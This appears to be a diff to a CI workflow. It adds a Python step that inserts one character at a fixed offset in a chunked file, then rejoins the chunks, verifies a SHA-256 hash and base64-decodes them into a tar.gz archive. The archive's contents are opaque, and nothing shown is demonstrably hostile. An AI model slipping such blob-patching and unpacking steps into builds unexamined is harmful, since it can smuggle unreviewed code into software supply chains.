@@ -22,6 +22,13 @@ jobs:
           set +e
           {
             set -euxo pipefail
+            python - <<'PY'
+            from pathlib import Path
+            path = Path('.v110/part04')
+            data = path.read_text()
+            if len(data) == 7999 and data[3678:3698] == 'hWsWW2195LOVdNu8PD1K':
+                path.write_text(data[:3688] + 'G' + data[3688:])
+            PY
             cat .v110/part* | tr -d '\r\n' > /tmp/v110.b64
             echo 'ee4a5c6b771d744010b5b6f666dd88759e1d94ae3128402a971f2323a3379900  /tmp/v110.b64' | sha256sum -c -
             base64 -d /tmp/v110.b64 > /tmp/v110.tar.gz
